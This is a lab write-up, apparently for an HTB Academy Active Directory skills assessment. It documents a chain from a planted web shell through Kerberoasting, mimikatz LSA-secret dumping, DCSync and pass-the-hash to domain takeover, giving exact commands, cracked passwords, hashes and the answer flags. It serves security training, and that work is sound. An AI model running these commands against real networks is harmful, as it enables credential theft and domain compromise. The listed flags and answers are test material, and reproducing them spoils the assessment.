# Skills Assessment — AD Enumeration Attacks

## Context
> A team member started an External Penetration Test and was moved to another urgent project before they could finish. They found and exploited a file upload vulnerability on an externally-facing web server and left a password-protected web shell in place for us to continue. We need to leverage the web shell to gain an initial foothold in the internal network, enumerate the Active Directory environment, find flaws and misconfigurations to move laterally, and ultimately achieve domain compromise.

---

## Objectives (All Complete ✅)

- [x] Access the web shell at /uploads
- [x] Gain foothold on the web server
- [x] Enumerate AD environment
- [x] Kerberoast an account with SPN MSSQLSvc/SQL01.inlanefreight.local:1433
- [x] Crack the kerberoasted password
- [x] Find cleartext credentials for another domain user
- [x] Identify and perform privilege escalation attack
- [x] Take over the domain (DC01)
- [x] Capture all flags along the way

---

## Questions & Answers

| # | Question | Answer | Status |
|---|----------|--------|--------|
| 1 | Submit the contents of flag.txt on Administrator Desktop of web server | `JusT_g3tt1ng_st@rt3d!` | ✅ |
| 2 | Kerberoast an account with SPN MSSQLSvc/SQL01.inlanefreight.local:1433 — submit account name | `svc_sql` | ✅ |
| 3 | Crack the account's password — submit cleartext | `lucky7` | ✅ |
| 4 | Submit flag.txt on Administrator desktop on MS01 | `spn$_r0ast1ng_on_@n_0p3n_f1re` | ✅ |
| 5 | Find cleartext credentials for another domain user — submit username | `tpetty` | ✅ |
| 6 | Submit this user's cleartext password | `Sup3rS3cur3D0m@inU2eR` | ✅ |
| 7 | What attack can this user perform? | **DCSync** | ✅ |
| 8 | Take over the domain — submit flag.txt on Administrator Desktop on DC01 | `r3plicat1on_m@st3r!` | ✅ |

---

## Attack Path Summary

```
[External Attacker]
    |
    | HTTP → Web Shell
    v
[WEB-WIN01: 10.129.81.83] — SYSTEM via web shell
    |
    | Ligolo tunnel + RDP
    v
[MS01: 172.16.6.50] — svc_sql:lucky7
    |
    | mimikatz lsadump::secrets → tpetty creds
    v
[tpetty:Sup3rS3cur3D0m@inU2eR] → DCSync → Administrator hash
    |
    | Pass-the-Hash (wmiexec)
    v
[DC01: 172.16.6.3] — Domain Compromise
```

---

## Phase 1: Web Shell → SYSTEM on WEB-WIN01

**Access:** `http://10.129.77.54/uploads/` with `admin:My_W3bsH3ll_P@ssw0rd!`

The web shell gave us `NT AUTHORITY\SYSTEM` immediately — no privilege escalation needed.

**Key enumeration:**
- Host: `WEB-WIN01` / Domain: `INLANEFREIGHT.LOCAL`
- IP: `172.16.6.100` (internal), `10.129.81.83` (HTB external)
- DC: `DC01` at `172.16.6.3`

**Flag 1:**
```cmd
type C:\Users\Administrator\Desktop\flag.txt
JusT_g3tt1ng_st@rt3d!
```

---

## Phase 2: Kerberoasting svc_sql

**Find the SPN:**
```cmd
setspn -T INLANEFREIGHT.LOCAL -F -Q MSSQLSvc/SQL01.inlanefreight.local:1433
# → CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
```

**Roast it with Rubeus:**
```cmd
.\Rubeus.exe kerberoast /user:svc_sql /outfile:C:\Windows\Temp\svc_sql.txt
```

**Crack with hashcat:**
```bash
hashcat -m 13100 svc_sql.txt /usr/share/wordlists/rockyou.txt
# → lucky7
```

---

## Phase 3: Lateral Movement to MS01

**Discover MS01:**
```cmd
nslookup MS01.inlanefreight.local
# → 172.16.6.50
```

**Pivot via ligolo** — tunnel established from attack box through WEB-WIN01 to internal network.

**RDP as svc_sql:**
```bash
xfreerdp3 /v:172.16.6.50 /u:svc_sql /p:lucky7 /cert:ignore
```

**Flag 2:**
```cmd
type C:\Users\Administrator\Desktop\flag.txt
spn$_r0ast1ng_on_@n_0p3n_f1re
```

---

## Phase 4: Credential Discovery (tpetty)

On MS01 with local admin (svc_sql), run mimikatz:

```cmd
mimikatz # privilege::debug
mimikatz # lsadump::secrets
```

**Critical find — Autologon password in LSA secrets:**
```
Secret  : DefaultPassword
cur/text: Sup3rS3cur3D0m@inU2eR
```

Registry confirmed autologon is configured:
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /s
# AutoAdminLogon = 1
# DefaultUserName = tpetty
# DefaultDomainName = INLANEFREIGHT
```

Also found `tpetty` in `sekurlsa::logonpasswords` with NTLM hash `fd37b6fec5704cadabb319cebf9e3a3a`.

**tpetty's AD membership:** `Domain Users` only (via `net user tpetty /domain`). No special groups.

---

## Phase 5: Domain Compromise via DCSync

**DCSync with tpetty's cleartext password:**
```bash
impacket-secretsdump INLANEFREIGHT/tpetty:Sup3rS3cur3D0m@inU2eR@172.16.6.3
```

**Output:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6dbd63f4a0e7c8b221d61f265c4a08a7:::
```

**Why this works (DCSync evidence):**
- `tpetty` has `GetChanges` + `GetChangesAll` ExtendedRights on the domain object
- `secretsdump` uses `DRSUAPI` (replication protocol) — confirmed by output: `[*] Using the DRSUAPI method to get NTDS.DIT secrets`
- BloodHound would show `tpetty` → `DCSync` → `INLANEFREIGHT.LOCAL`

---

## Phase 6: Pass-the-Hash → DC01

Administrator hash did **not** crack with rockyou.txt. Used PtH instead:

```bash
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0 Administrator@172.16.6.3
```

**Flag 3 (Domain Compromise):**
```cmd
type C:\Users\Administrator\Desktop\flag.txt
r3plicat1on_m@st3r!
```

---

## Credentials Discovered

| Account | Password / Hash | Source | Valid On | Notes |
|---------|-----------------|--------|----------|-------|
| admin (web shell) | `My_W3bsH3ll_P@ssw0rd!` | Given | Web shell | Initial access |
| svc_sql | `lucky7` | Kerberoast + hashcat | Domain | SPN: MSSQLSvc/SQL01 |
| tpetty | `Sup3rS3cur3D0m@inU2eR` | LSA secret (autologon) | Domain | DCSync-capable |
| Administrator | NTLM: `27dedb1dab4d8545c6e1c66fba077da0` | DCSync dump | DC01 | PtH to domain admin |
| krbtgt | NTLM: `6dbd63f4a0e7c8b221d61f265c4a08a7` | DCSync dump | Domain | Golden Ticket material |

---

## Flags Summary

| Host | Location | Flag |
|------|----------|------|
| Web Server (WEB-WIN01) | `C:\Users\Administrator\Desktop\flag.txt` | `JusT_g3tt1ng_st@rt3d!` |
| MS01 | `C:\Users\Administrator\Desktop\flag.txt` | `spn$_r0ast1ng_on_@n_0p3n_f1re` |
| DC01 | `C:\Users\Administrator\Desktop\flag.txt` | `r3plicat1on_m@st3r!` |

---

## Key Tools Used

| Tool | Purpose |
|------|---------|
| Web shell (PHP) | Initial foothold |
| Rubeus | Kerberoasting svc_sql |
| hashcat | Cracking krb5tgs hash |
| ligolo-ng | Tunnel/pivot to internal network |
| xfreerdp3 | RDP to MS01 |
| mimikatz | LSASS dump + LSA secrets (tpetty creds) |
| impacket-secretsdump | DCSync attack |
| impacket-wmiexec | Pass-the-Hash to DC01 |
| impacket-lookupsid | Domain SID enumeration |

---

## Lessons Learned

1. **Kerberoasting is still gold** — svc_sql had a weak password (`lucky7`) on an SPN. Always check for roastable accounts.
2. **LSA Secrets hold autologon passwords** — `DefaultPassword` is cleartext in `lsadump::secrets`. Registry shows the user (`tpetty`), but secrets hold the actual password.
3. **DCSync doesn't require Domain Admin** — `tpetty` was just a `Domain User` but had `GetChanges` + `GetChangesAll` ACLs on the domain object. BloodHound would show this visually.
4. **Pass-the-Hash beats cracking** — when the hash doesn't crack (or cracking is slow), PtH via `impacket-wmiexec` gives immediate access without ever knowing the plaintext.
5. **Pivot early** — ligolo tunnel through the compromised web server was essential to reach MS01 and DC01 from the attack box.

---

*Completed: 2026-04-27*
*Status: ✅ COMPLETE — Domain compromise achieved*
